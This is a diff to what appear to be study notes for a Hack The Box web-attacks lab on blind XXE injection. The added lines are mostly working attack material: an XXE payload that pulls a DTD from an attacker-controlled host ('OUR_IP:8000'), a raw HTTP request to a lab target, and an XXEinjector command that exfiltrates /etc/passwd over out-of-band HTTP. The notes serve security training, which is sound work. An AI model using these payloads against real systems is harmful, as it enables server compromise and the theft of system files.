@@ -135,6 +135,47 @@ sudo nano xxe2.dtd
 ```bash
 php -S 0.0.0.0:8000
 ```
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+### Automated OOB Exfiltration
+```
+[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
+
+Cloning into 'XXEinjector'...
+...SNIP...
+```
+```
+Code: http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+```
+[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+...SNIP...
+[+] Sending request with malicious XML.
+[+] Responding with XML for: /etc/passwd
+[+] Retrieved data:
+```
 
 ## Web Attacks - Skills Assessment
 
